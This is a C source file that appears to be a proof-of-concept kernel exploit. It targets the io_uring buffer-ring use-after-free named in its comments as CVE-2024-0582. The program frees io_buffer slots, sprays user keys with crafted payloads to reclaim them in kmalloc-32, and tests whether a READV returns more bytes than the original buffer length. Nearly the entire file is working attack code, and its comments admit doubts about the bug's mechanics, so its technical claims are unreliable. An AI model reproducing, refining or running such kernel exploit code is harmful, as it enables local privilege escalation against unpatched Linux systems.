#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <stdint.h>
#include <linux/keyctl.h>

#ifndef __NR_io_uring_setup
#define __NR_io_uring_setup 425
#endif
#ifndef __NR_io_uring_enter
#define __NR_io_uring_enter 426
#endif
#ifndef __NR_io_uring_register
#define __NR_io_uring_register 427
#endif
#ifndef __NR_add_key
#define __NR_add_key 217
#endif
#ifndef __NR_keyctl
#define __NR_keyctl 218
#endif

#define IORING_OP_PROVIDE_BUFFERS 31
#define IORING_OP_REMOVE_BUFFERS 32
#define IORING_OP_READV 1

#define IOSQE_BUFFER_SELECT (1U << 1)

struct io_uring_sqe
{
    uint8_t opcode;
    uint8_t flags;
    uint16_t ioprio;
    int32_t fd;
    union
    {
        uint64_t off;
        uint64_t addr2;
    };
    union
    {
        uint64_t addr;
        uint64_t splice_off_in;
    };
    uint32_t len;
    union
    {
        uint32_t rw_flags;
        uint32_t buf_index;
        uint32_t buf_group;
    };
    uint64_t user_data;
    union
    {
        uint16_t buf_index_16;
        uint16_t buf_group_16;
    };
    int32_t personality;
    int32_t splice_fd_in;
    uint64_t __pad2[2];
};

struct io_uring_cqe
{
    uint64_t user_data;
    int32_t res;
    uint32_t flags;
};

struct io_uring_params
{
    uint32_t sq_entries;
    uint32_t cq_entries;
    uint32_t flags;
    uint32_t sq_thread_cpu;
    uint32_t sq_thread_idle;
    uint32_t features;
    uint32_t wq_fd;
    uint32_t resv[3];
    struct
    {
        uint32_t head;
        uint32_t tail;
        uint32_t ring_mask;
        uint32_t ring_entries;
        uint32_t flags;
        uint32_t dropped;
        uint32_t array;
        uint32_t resv1;
        uint64_t resv2;
    } sq_off;
    struct
    {
        uint32_t head;
        uint32_t tail;
        uint32_t ring_mask;
        uint32_t ring_entries;
        uint32_t overflow;
        uint32_t cqes;
        uint32_t flags;
        uint32_t resv1;
        uint64_t resv2;
    } cq_off;
};

struct io_uring_ring
{
    int ring_fd;
    struct io_uring_params params;
    void *sq_ptr;
    void *cq_ptr;
    unsigned *sq_head;
    unsigned *sq_tail;
    unsigned *sq_mask;
    unsigned *sq_array;
    unsigned *cq_head;
    unsigned *cq_tail;
    unsigned *cq_mask;
    struct io_uring_sqe *sqes;
    struct io_uring_cqe *cqes;
};

static int io_uring_setup(unsigned entries, struct io_uring_params *p)
{
    return syscall(__NR_io_uring_setup, entries, p);
}

static int io_uring_enter(int fd, unsigned to_submit, unsigned min_complete,
                          unsigned flags, void *sig)
{
    return syscall(__NR_io_uring_enter, fd, to_submit, min_complete, flags, sig);
}

static int setup_uring(struct io_uring_ring *ring)
{
    memset(&ring->params, 0, sizeof(ring->params));
    ring->ring_fd = io_uring_setup(32, &ring->params);
    if (ring->ring_fd < 0)
        return -1;

    size_t sq_ring_sz = ring->params.sq_off.array + ring->params.sq_entries * sizeof(unsigned);
    size_t cq_ring_sz = ring->params.cq_off.cqes + ring->params.cq_entries * sizeof(struct io_uring_cqe);
    size_t sqes_sz = ring->params.sq_entries * sizeof(struct io_uring_sqe);

    ring->sq_ptr = mmap(0, sq_ring_sz, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, ring->ring_fd, 0);
    ring->cq_ptr = mmap(0, cq_ring_sz, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, ring->ring_fd, 0x8000000ULL);

    // Explicitly mapping sqes separately
    ring->sqes = mmap(0, sqes_sz, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, ring->ring_fd, 0x10000000ULL);

    if (ring->sq_ptr == MAP_FAILED || ring->cq_ptr == MAP_FAILED || ring->sqes == MAP_FAILED)
    {
        return -1;
    }

    ring->sq_head = ring->sq_ptr + ring->params.sq_off.head;
    ring->sq_tail = ring->sq_ptr + ring->params.sq_off.tail;
    ring->sq_mask = ring->sq_ptr + ring->params.sq_off.ring_mask;
    ring->sq_array = ring->sq_ptr + ring->params.sq_off.array;
    ring->cq_head = ring->cq_ptr + ring->params.cq_off.head;
    ring->cq_tail = ring->cq_ptr + ring->params.cq_off.tail;
    ring->cq_mask = ring->cq_ptr + ring->params.cq_off.ring_mask;
    ring->cqes = ring->cq_ptr + ring->params.cq_off.cqes;

    return 0;
}

static struct io_uring_sqe *get_sqe(struct io_uring_ring *ring)
{
    unsigned head = *ring->sq_head;
    unsigned tail = *ring->sq_tail;
    unsigned mask = *ring->sq_mask;
    unsigned next_tail = tail + 1;

    if (next_tail - head > *ring->sq_mask)
        return NULL;

    struct io_uring_sqe *sqe = &ring->sqes[tail & mask];
    memset(sqe, 0, sizeof(*sqe));
    sqe->fd = -1;
    return sqe;
}

static void submit_sqe(struct io_uring_ring *ring)
{
    unsigned tail = *ring->sq_tail;
    unsigned mask = *ring->sq_mask;
    ring->sq_array[tail & mask] = tail & mask;
    __sync_synchronize();
    *ring->sq_tail = tail + 1;
    __sync_synchronize();
    io_uring_enter(ring->ring_fd, 1, 1, 0, NULL);
}

// Key Spraying
static long add_key(const char *type, const char *desc, const void *payload, size_t plen, int keyring)
{
    return syscall(__NR_add_key, type, desc, payload, plen, keyring);
}

int main(int argc, char **argv)
{
    struct io_uring_ring ring;
    if (setup_uring(&ring) < 0)
    {
        perror("setup_uring");
        return 1;
    }

    printf("[*] io_uring setup complete\n");

    // 1. Allocate backing buffer
    void *buf = mmap(NULL, 0x1000 * 100, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memset(buf, 'A', 0x1000 * 100);

    // 2. Provide Buffers (Allocates io_buffer in kmalloc-32)
    printf("[*] Providing 100 buffers...\n");
    for (int i = 0; i < 100; i++)
    {
        struct io_uring_sqe *sqe = get_sqe(&ring);
        sqe->opcode = IORING_OP_PROVIDE_BUFFERS;
        sqe->fd = 1;
        sqe->addr = (uint64_t)buf + i * 0x100;
        sqe->len = 0x100;
        sqe->off = 1; // BGID 1
        sqe->buf_index_16 = i;
        sqe->user_data = i;
        submit_sqe(&ring);
    }

    printf("[*] Buffers provided. Now removing to create holes...\n");

    // 3. Remove Buffers (Frees io_buffer, creating holes in kmalloc-32)
    // We remove every second one to fragment heap?
    // Actually, CVE-2024-0582 UAF implies the buffer is removed BUT still accessible.
    // If we remove them, and then spray, we hope to occupy the slot.
    // Then we need to trigger a USE of the buffer.
    // In CVE-2024-0582, the UAF is triggered by racing or logic bug where the buffer is NOT removed from the xarray/list but freed.
    // So we invoke REMOVE_BUFFERS.

    struct io_uring_sqe *sqe = get_sqe(&ring);
    sqe->opcode = IORING_OP_REMOVE_BUFFERS;
    sqe->fd = 50; // Remove 50 buffers
    sqe->off = 1; // BGID 1
    submit_sqe(&ring);

    // Note: REMOVE_BUFFERS typically removes by Count, starting from... head?
    // It's specific to the logic.

    printf("[*] Buffers removed. Spraying Keys into kmalloc-32...\n");

    // 4. Spray Keys
    char payload[8]; // 8 bytes payload -> total alloc ~32 bytes
    memset(payload, 'B', sizeof(payload));

    // We reconstruct what would be in the leaked io_buffer (at offset 24)
    // Offset 24 in io_buffer is {len, bid, bgid}
    // We set payload to control these.
    // But payload is at offset 24 in user_key_payload too?
    // user_key_payload (24 bytes) + payload.
    // So payload[0] aligns with io_buffer offset 24.

    // desired len = 0x1000 (4 bytes)
    // desired bid = 0 (2 bytes)
    // desired bgid = 1 (2 bytes)
    uint32_t *target_len = (uint32_t *)&payload[0];
    uint16_t *target_bid = (uint16_t *)&payload[4];
    uint16_t *target_bgid = (uint16_t *)&payload[6];

    *target_len = 0x1337; // BIG length
    *target_bid = 0;
    *target_bgid = 1;

    char desc[32];
    for (int k = 0; k < 100; k++)
    {
        sprintf(desc, "spray_key_%d", k);
        add_key("user", desc, payload, sizeof(payload), KEY_SPEC_PROCESS_KEYRING);
    }

    printf("[*] Spray complete. Attempting to USE valid buffers (or UAF buffers)...\n");

    // 5. Trigger Use
    // If UAF worked, one of the removed buffers is now a Key.
    // The Key payload says len=0x1337.
    // The original buffers had len=0x100.
    // If we can read 0x1337 bytes, we prove successful control of 'len'.

    char read_buf[0x2000];
    int pipefd[2];
    pipe(pipefd);
    write(pipefd[1], "TEST", 4);

    struct io_uring_sqe *rw_sqe = get_sqe(&ring);
    rw_sqe->opcode = IORING_OP_READV;
    rw_sqe->fd = pipefd[0];
    rw_sqe->addr = (uint64_t)read_buf;
    rw_sqe->len = 0x1337; // Try to read MORE than original 0x100
    rw_sqe->flags = IOSQE_BUFFER_SELECT;
    rw_sqe->buf_group = 1;
    rw_sqe->user_data = 9999;

    submit_sqe(&ring);

    // Check CQE
    unsigned head = *ring.cq_head;
    while (head == *ring.cq_tail)
    {
        usleep(1000);
    }

    struct io_uring_cqe *cqe = &ring.cqes[head & *ring.cq_mask];
    printf("[*] Operation Result: %d\n", cqe->res);

    if (cqe->res > 0x100)
    {
        printf("[!!!] SUCCESS! Read %d bytes (expected max 0x100 without exploit)\n", cqe->res);
        printf("[!!!] We controlled the buffer length via Key Spray!\n");
    }
    else if (cqe->res == -ENOBUFS)
    {
        printf("[-] No buffers available (UAF failed to preserve entry)\n");
    }
    else
    {
        printf("[-] Result: %d (Normal or Failed)\n", cqe->res);
    }

    return 0;
}
